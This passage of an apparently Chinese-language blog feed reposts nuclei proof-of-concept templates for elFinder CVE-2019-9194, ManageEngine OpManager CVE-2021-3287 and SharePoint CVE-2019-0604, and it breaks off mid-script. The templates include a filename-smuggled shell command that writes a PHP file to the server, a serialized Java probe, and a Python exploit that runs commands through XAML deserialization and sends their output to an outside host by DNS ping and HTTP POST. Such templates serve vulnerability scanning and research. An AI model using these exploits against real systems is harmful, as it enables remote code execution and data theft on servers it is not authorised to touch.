class="hljs-number">2.1</span>.<span class="hljs-number">48</span> has a command injection vulnerability <span class="hljs-keyword">in</span> the PHP connector.<br>    The vulnerability occurs when performing image operations on JPEG files, where the filename<br>    is passed to the `exiftran` utility without proper sanitization, allowing command injection.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.exploit-db.com/exploits/46481</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.exploit-db.com<span class="hljs-operator">/</span>exploits<span class="hljs-operator">/</span><span class="hljs-number">46539</span><span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2019-9194</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/cved-sources/cve-2019-9194</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/Studio-42/elFinder/releases/tag/2.1.48</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">9194</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">78</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.92059</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">1.0</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">3</span><br>    <span class="hljs-params">vendor:</span> studio-<span class="hljs-number">42</span><br>    <span class="hljs-params">product:</span> elfinder<br>    <span class="hljs-params">shodan-query:</span> &#x27;http.title:<span class="hljs-string">&quot;elfinder&quot;</span>&#x27;<br>  <span class="hljs-params">tags:</span> cve,cve2019,elfinder,rce,intrusive,file-upload<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">rand_string:</span> &#x27;&#123;&#123;to_lower(rand_text_alpha(<span class="hljs-number">6</span>))&#125;&#125;&#x27;<br>  <span class="hljs-params">file_name:</span> &#x27;&#123;&#123;to_lower(rand_text_alpha(<span class="hljs-number">6</span>))&#125;&#125;&#x27;<br>  <span class="hljs-params">php_cmd:</span> <span class="hljs-string">&quot;&lt;?php echo md5(&#x27;&#123;&#123;file_name&#125;&#125;&#x27;);unlink(__FILE__);?&gt;&quot;</span><br>  <span class="hljs-params">payload:</span> <span class="hljs-string">&quot;&#123;&#123;rand_string&#125;&#125;.jpeg;echo &#123;&#123;base64(php_cmd)&#125;&#125; | base64 -d &gt; &#123;&#123;file_name&#125;&#125;.php;echo &#123;&#123;rand_string&#125;&#125;.jpeg&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/php/connector.minimal.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/form-data</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span><span class="hljs-operator">-</span>---WebKitFormBoundary7MA4YWxkTrZu0gW<br><br>        <span class="hljs-operator">-</span>-----WebKitFormBoundary7MA4YWxkTrZu0gW<br>        <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;cmd&quot;</span><br><br>        upload<br>        <span class="hljs-operator">-</span>-----WebKitFormBoundary7MA4YWxkTrZu0gW<br>        <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;target&quot;</span><br><br>        l1_Lw<br>        <span class="hljs-operator">-</span>-----WebKitFormBoundary7MA4YWxkTrZu0gW<br>        <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;upload[]&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;&#123;payload&#125;&#125;&quot;</span><br>        <span class="hljs-params">Content-Type:</span> image<span class="hljs-symbol">/jpeg</span><br><br>        &#123;&#123;hex_decode(<span class="hljs-string">&quot;ffd8ffe000104a46494600010101006000600000ffed003850686f746f73686f7020332e30003842494d040400000000001c1c027400101c020000020004fffe003b43524541544f523a2067642d6a7065672076312e3020287573696e6720494a47204a50454720763830292c207175616c697479203d2038320affdb0043000604040504040605050506060607090e0909080809120d0d0a0e1512161615121414171a211c17181f1914141d271d1f2223252525161c292c28242b21242524ffdb00430106060609080911090911241814182424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424ffc000110800c0010603012200021101031101ffc4001f&quot;</span>)&#125;&#125;<br>        <span class="hljs-operator">-</span>-----WebKitFormBoundary7MA4YWxkTrZu0gW--<br><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>php<span class="hljs-operator">/</span>connector.minimal.php<span class="hljs-operator">?</span>target<span class="hljs-operator">=</span>&#123;&#123;hash&#125;&#125;&amp;degree<span class="hljs-operator">=</span><span class="hljs-number">180</span>&amp;mode<span class="hljs-operator">=</span>rotate&amp;cmd<span class="hljs-operator">=</span>resize HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>php<span class="hljs-operator">/</span>&#123;&#123;file_name&#125;&#125;.php HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> json<br>        <span class="hljs-params">part:</span> body_1<br>        <span class="hljs-params">name:</span> hash<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">json:</span><br>          <span class="hljs-operator">-</span> &#x27;.added[<span class="hljs-number">0</span>].hash&#x27;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body_1<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;added&quot;</span>:&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;hash&quot;</span>:&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">part:</span> header_2<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body_3<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;md5(file_name)&#125;&#125;&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; elFinder 命令注入漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/s</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>ManageEngine OpManager 反序列化远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/26/github_902416703/"/>
    <id>http://example.com/2025/06/26/github_902416703/</id>
    <published>2025-06-26T11:45:14.424Z</published>
    <updated>2025-06-26T11:45:14.422Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ManageEngine OpManager 反序列化远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-3287</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> ManageEngine OpManager存在一个预认证的Java反序列化漏洞，允许远程代码执行。此模板测试CVE-2021-3287补丁绕过行为。</p><p><strong>产品厂商：</strong> ManageEngine</p><p><strong>产品名称：</strong> OpManager</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/fe4bdbac6053f6a58e97bec111f4e6efd8e8f0c5/http%2Fcves%2F2021%2FCVE-2021-3287.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/fe4bdbac6053f6a58e97bec111f4e6efd8e8f0c5/http%2Fcves%2F2021%2FCVE-2021-3287.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">3287</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> ManageEngine OpManager Deserialization RCE <span class="hljs-operator">-</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">3287</span><br>  <span class="hljs-params">author:</span> tomaquet18<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    ManageEngine OpManager is vulnerable to a pre-authentication Java deserialization vulnerability<br>    that allows for remote code execution. This template tests for CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">3287</span> patch bypass behavior.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>haxolot.com<span class="hljs-operator">/</span>posts<span class="hljs-operator">/</span><span class="hljs-number">2021</span><span class="hljs-operator">/</span>manageengine_opmanager_pre_auth_rce<span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2021-3287</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/opmanager_sumpdu_deserialization.rb</span><br>  <span class="hljs-params">tags:</span> rce,java,deserialization,opmanager,cve,cve2021<br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">false</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/servlets/com.adventnet.tools.sum.transport.SUMHandShakeServlet</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/octet-stream</span><br>        <span class="hljs-params">Content-Length:</span> <span class="hljs-number">10</span><br><br>        &#123;&#123;hex_decode(<span class="hljs-string">&quot;aced00057704000003ea&quot;</span>)&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> binary<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">binary:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;aced0005&quot;</span> <span class="hljs-comment"># Java serialization stream header</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Set-Cookie: JSESSIONID=&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ManageEngine OpManager 反序列化远程代码执行漏洞&lt;/p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Microsoft SharePoint 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/26/github_4164314878/"/>
    <id>http://example.com/2025/06/26/github_4164314878/</id>
    <published>2025-06-26T11:18:47.323Z</published>
    <updated>2025-06-26T11:18:47.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Microsoft SharePoint 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-0604</li></ul><p><strong>漏洞类型：</strong> 远程代码执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Microsoft SharePoint存在一个远程代码执行漏洞，原因是未能检查应用程序包的源标记，允许远程攻击者通过发送恶意的应用程序包执行任意代码。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> SharePoint</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:a:microsoft:sharepoint_server”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/3982021419c8b7f48102e74ec1b244017fe651ea/code%2Fcves%2F2019%2FCVE-2019-0604.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/3982021419c8b7f48102e74ec1b244017fe651ea/code%2Fcves%2F2019%2FCVE-2019-0604.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-built_in">id</span>: CVE-<span class="hljs-number">2019</span>-0604<br><br>info:<br>  name: Microsoft SharePoint - Remote Code Execution<br>  author: tree-chtsec,pszyszkowski<br>  severity: critical<br>  description: |<br>    Microsoft SharePoint contains a remote code execution caused by failure to check the source markup of an application package, letting remote attackers execute arbitrary code, exploit requires sending malicious application package.<br>  remediation: |<br>    Fixed <span class="hljs-keyword">in</span> security update published Feb <span class="hljs-number">12</span>, <span class="hljs-number">2019</span><br>  reference:<br>    - https://github.com/Gh0st0ne/weaponized-0604<br>    - https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-<span class="hljs-number">2019</span>-0604<br>    - https://nvd.nist.gov/vuln/detail/cve-<span class="hljs-number">2019</span>-0604<br>  classification:<br>    cvss-metrics: CVSS:<span class="hljs-number">3.1</span>/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H<br>    cvss-score: <span class="hljs-number">9.8</span><br>    cve-<span class="hljs-built_in">id</span>: CVE-<span class="hljs-number">2019</span>-0604<br>    cwe-<span class="hljs-built_in">id</span>: CWE-<span class="hljs-number">20</span><br>  metadata:<br>    verified: true<br>    vendor: microsoft<br>    product: sharepoint<br>    shodan-query: cpe:<span class="hljs-string">&quot;cpe:2.3:a:microsoft:sharepoint_server&quot;</span><br>  tags: cve,cve2019,sharepoint,microsoft,rce,kev<br><br>variables:<br>  OAST: <span class="hljs-string">&quot;&#123;&#123;interactsh-url&#125;&#125;&quot;</span><br>  marker: <span class="hljs-string">&quot;&#123;&#123;randbase(5)&#125;&#125;&quot;</span><br><br>code:<br>  - engine:<br>      - py<br>      - python3<br><br>    source: |<br>      <span class="hljs-keyword">import</span> os<br>      <span class="hljs-keyword">import</span> sys<br>      <span class="hljs-keyword">import</span> base64<br>      <span class="hljs-keyword">import</span> argparse<br>      <span class="hljs-keyword">from</span> copy <span class="hljs-keyword">import</span> deepcopy<br>      <span class="hljs-keyword">import</span> urllib3<br>      <span class="hljs-keyword">import</span> requests<br>      <span class="hljs-keyword">import</span> lxml.html<br>      <span class="hljs-keyword">import</span> codecs<br>      <span class="hljs-keyword">from</span> xml.sax.saxutils <span class="hljs-keyword">import</span> escape<br>      urllib3.disable_warnings()<br>      default_ua = <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&#x27;</span><br>      part1 = <span class="hljs-string">&#x27;System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089:&#x27;</span><br>      part2 = <span class="hljs-string">&#x27;&lt;ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:a=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:b=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;ExpandedElement/&gt;&lt;ProjectedProperty0&gt;&lt;MethodName&gt;Parse&lt;/MethodName&gt;&lt;MethodParameters&gt;&lt;anyType a:type=&quot;b:string&quot;&gt;%s&lt;/anyType&gt;&lt;/MethodParameters&gt;&lt;ObjectInstance a:type=&quot;XamlReader&quot;&gt;&lt;/ObjectInstance&gt;&lt;/ProjectedProperty0&gt;&lt;/ExpandedWrapperOfXamlReaderObjectDataProvider&gt;&#x27;</span><br>      content = <span class="hljs-string">&#x27;&lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:c=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:d=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt; &lt;ObjectDataProvider x:Key=&quot;&quot; ObjectType=&quot;&#123;x:Type d:Process&#125;&quot; MethodName=&quot;Start&quot;&gt; &lt;ObjectDataProvider.MethodParameters&gt; &lt;c:String&gt;%(base)s&lt;/c:String&gt; &lt;c:String&gt;%(arg)s&lt;/c:String&gt; &lt;/ObjectDataProvider.MethodParameters&gt; &lt;/ObjectDataProvider&gt; &lt;/ResourceDictionary&gt;&#x27;</span><br>      paths = [os.getenv(<span class="hljs-string">&quot;Path&quot;</span>), <span class="hljs-string">&#x27;/_vti_pvt/picker.aspx&#x27;</span>, <span class="hljs-string">&#x27;/_app_bin/picker.aspx&#x27;</span>, <span class="hljs-string">&#x27;/_controltemplates/picker.aspx&#x27;</span>, <span class="hljs-string">&#x27;/_login/picker.aspx&#x27;</span>, <span class="hljs-string">&#x27;/_windows/picker.aspx&#x27;</span>, <span class="hljs-string">&#x27;/_layouts/15/picker.aspx&#x27;</span>, <span class="hljs-string">&#x27;/_wpresources/picker.aspx&#x27;</span>, <span class="hljs-string">&#x27;/_vti_bin/picker.aspx&#x27;</span>]<br>      host = os.getenv(<span class="hljs-string">&#x27;RootURL&#x27;</span>)<br>      domain = os.getenv(<span class="hljs-string">&#x27;OAST&#x27;</span>)<br>      user = os.getenv(<span class="hljs-string">&#x27;username&#x27;</span>)<br>      pswd = os.getenv(<span class="hljs-string">&#x27;password&#x27;</span>)<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">html_escape</span>(<span class="hljs-params">s</span>):<br>          _ = escape(s)<br>          _ = _.replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)<br>          <span class="hljs-keyword">return</span> _<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">_0604</span>(<span class="hljs-params">cmd</span>):<br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">in</span> cmd <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;|&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cmd[:cmd.find(<span class="hljs-string">&#x27; &#x27;</span>)]: <span class="hljs-comment"># avoid command problem (TODO : find a better solution)</span><br>              _<span class="hljs-built_in">bin</span>, _arg = cmd.split(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">1</span>)<br>          <span class="hljs-keyword">else</span>:<br>              _<span class="hljs-built_in">bin</span> = <span class="hljs-string">&#x27;cmd&#x27;</span><br>              _arg = <span class="hljs-string">&#x27;/c &#x27;</span> + cmd<br>          payload = part1 + part2 % html_escape(content % <span class="hljs-built_in">dict</span>(base=html_escape(_<span class="hljs-built_in">bin</span>), arg=html_escape(_arg)))<br>          o = <span class="hljs-string">&#x27;&#x27;</span>.join(codecs.encode(codecs.encode(x, <span class="hljs-string">&#x27;utf-16be&#x27;</span>), <span class="hljs-string">&#x27;hex&#x27;</span>).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)[::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> payload)<br>          <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;__bp&#x27;</span> + <span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(o), <span class="hljs-string">&#x27;x&#x27;</span>)[::-<span class="hljs-number">1</span>] + o<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>          auth = <span class="hljs-string">&#x27;&#x27;</span><br>          cmd = <span class="hljs-string">&#x27;echo &#x27;</span> + os.getenv(<span class="hljs-string">&#x27;marker&#x27;</span>)<br>          <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">None</span>) <span class="hljs-keyword">and</span> (pswd != <span class="hljs-literal">None</span>):<br>              auth = user + <span class="hljs-string">&#x27;:&#x27;</span> + pswd<br>              ntlm = <span class="hljs-literal">True</span><br>          <span class="hljs-keyword">else</span>:<br>              ntlm = <span class="hljs-literal">False</span><br>          <span class="hljs-keyword">if</span> host <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>              <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;missing target. You must specify -u &lt;url&gt;&quot;</span>)<br>              exit(<span class="hljs-number">1</span>)<br>          <span class="hljs-keyword">if</span> domain <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>              <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;OOB: &quot;%s&quot; will be executed in POWERSHELL context&#x27;</span> % (cmd))<br>              __var_raw = <span class="hljs-string">&#x27;$a&#x27;</span><br>              __var_hex = <span class="hljs-string">&#x27;$b&#x27;</span><br>              __dns_code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">      $bl = %(v_hex)s.length;$l = 60;$i = 0;</span><br><span class="hljs-string">      while($i -lt $bl) &#123;</span><br><span class="hljs-string">      $l = if(($bl - $i) -gt $l) &#123; $l &#125; else &#123; $bl - $i &#125;;</span><br><span class="hljs-string">      $v = %(v_hex)s.substring($i, $l);</span><br><span class="hljs-string">      ping -n 1 &quot;$i.$v.%(domain)s&quot;;</span><br><span class="hljs-string">      $i += $l; &#125;</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>.strip() % <span class="hljs-built_in">dict</span>(domain=domain, v_hex=__var_hex)<br>              __post_code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">      iwr -Uri %(domain)s -Method post -Body %(v_raw)s;</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>.strip() % <span class="hljs-built_in">dict</span>(domain=domain, v_raw=__var_raw)<br>              __code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">      %(v_raw)s = %(cmd)s;</span><br><span class="hljs-string">      $Encode = new-object &quot;System.Text.UTF8Encoding&quot;;</span><br><span class="hljs-string">      $bytearray = $Encode.GetBytes(%(v_raw)s);</span><br><span class="hljs-string">      